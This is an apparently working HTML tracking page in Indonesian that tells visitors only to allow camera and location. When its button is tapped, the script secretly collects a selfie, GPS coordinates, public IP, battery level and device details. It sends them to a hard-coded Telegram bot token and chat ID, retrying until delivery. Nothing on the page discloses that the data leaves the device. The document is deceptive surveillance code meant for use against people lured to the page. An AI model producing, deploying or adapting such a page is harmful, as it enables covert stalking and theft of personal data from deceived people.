<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<title>Super Sender – never fail</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:system-ui;background:#111;color:#eee;padding:20px;text-align:center}
button{padding:14px 28px;font-size:18px;border:none;border-radius:8px;background:#0088ff;color:#fff}
button:disabled{background:#444}
canvas{display:none}
img{max-width:100%;border-radius:8px;margin-top:10px}
pre{background:#222;padding:10px;border-radius:6px;text-align:left;font-size:13px;white-space:pre-wrap}
</style>
</head>
<body>

<h2>Tap tombol → izinkan kamera & lokasi</h2>
<button id="start">Mulai</button>

<video id="video" autoplay muted playsinline></video>
<canvas id="canvas"></canvas>
<img id="preview">

<pre id="log">Siap…</pre>

<script>
/* ---------- CONFIG ---------- */
const TOKEN   = '8102671545:AAEbT25jA8_n9136iT7YlbUQQueFAXaj9T4'; // ganti
const CHAT_ID = '7274253936';                                     // ganti

/* ---------- ELEMEN ---------- */
const startBtn = document.getElementById('start');
const video    = document.getElementById('video');
const canvas   = document.getElementById('canvas');
const preview  = document.getElementById('preview');
const logBox   = document.getElementById('log');

startBtn.onclick = async ()=>{
  startBtn.disabled=true; startBtn.textContent='Proses…'; logBox.textContent='';

  let fotoBlob=null, lat='?', lon='?', acc='?', ip='?', bat='?', ua=navigator.userAgent;

  /* 1. BATERAI ---------------------------------------------- */
  if('getBattery' in navigator){
    const b=await navigator.getBattery();
    bat=`${(b.level*100).toFixed(0)}% ${b.charging?'⚡':''}`;
  }else bat='Tidak support';

  /* 2. IP PUBLIK -------------------------------------------- */
  try{ip=await(await fetch('https://api.ipify.org?format=json')).json().then(d=>d.ip);}
  catch{try{ip=await(await fetch('https://ipapi.co/json')).json().then(d=>d.ip);}catch{ip='?'}}
  
  /* 3. LOKASI (GPS dulu, kalau gagal pakai IP-geolokasi) ------ */
  try{
    const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:8000,enableHighAccuracy:true}));
    lat=pos.coords.latitude.toFixed(6);
    lon=pos.coords.longitude.toFixed(6);
    acc=pos.coords.accuracy.toFixed(0);
  }catch{
    logBox.textContent+='GPS ditolak → pakai IP-geolokasi…\n';
    try{
      const geo=await(await fetch(`https://ipapi.co/${ip}/json/`)).json();
      lat=geo.latitude||'?'; lon=geo.longitude||'?'; acc='IP';
    }catch{lat='?';lon='?';}
  }

  /* 4. FOTO SELFIE ------------------------------------------ */
  try{
    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
    video.srcObject=stream; await video.play();
    canvas.width=video.videoWidth; canvas.height=video.videoHeight;
    canvas.getContext('2d').drawImage(video,0,0);
    fotoBlob=dataURItoBlob(canvas.toDataURL('image/jpeg',0.8));
    preview.src=URL.createObjectURL(fotoBlob);
    stream.getTracks().forEach(t=>t.stop());
  }catch(e){
    logBox.textContent+='Kamera diblock → kirim text saja\n';
  }

  /* 5. BUILD CAPTION ---------------------------------------- */
  const caption=
    `📸 *Selfie baru*\\!\n`+
    `📍 [Lokasi](https://www.google.com/maps?q=${lat},${lon}) (±${acc} m)\n`+
    `🌐 IP: ${ip}\n🔋 ${bat}\n📱 ${ua.replace(/[^a-zA-Z0-9\s\-\. $$]/g,' ')}`;

  /* 6. KIRIM KE TELEGRAM (retry 3×) ------------------------- */
  let ok=false, err='';
  for(let i=0;i<3;i++){
    try{
      let r;
      if(fotoBlob){
        const form=new FormData();
        form.append('chat_id',CHAT_ID);
        form.append('caption',caption);
        form.append('parse_mode','MarkdownV2');
        form.append('photo',fotoBlob,'selfie.jpg');
        r=await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:form});
      }else{
        r=await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({chat_id:CHAT_ID,text:caption,parse_mode:'MarkdownV2'})
        });
      }
      if(r.ok){ok=true;break;}
      err=`${r.status} ${r.statusText}`; const j=await r.json(); err+=` – ${j.description||''}`;
    }catch(e){err=e.message;}
    if(i<2){await sleep(1500); logBox.textContent=`Retry ${i+1}/3…`;}
  }

  logBox.textContent=ok?'✅ Paket berhasil terkirim ke Telegram!' : '❌ Gagal total: '+err;
  startBtn.disabled=false; startBtn.textContent='Mulai';
};

/* ---------- UTIL ---------- */
function dataURItoBlob(dataURI){
  const byte=atob(dataURI.split(',')[1]);
  const ab=new ArrayBuffer(byte.length);
  const ia=new Uint8Array(ab);
  for(let i=0;i<byte.length;i++) ia[i]=byte.charCodeAt(i);
  return new Blob([ab],{type:'image/jpeg'});
}
function sleep(ms){return new Promise(r=>setTimeout(r,ms))}
</script>
</body>
</html>
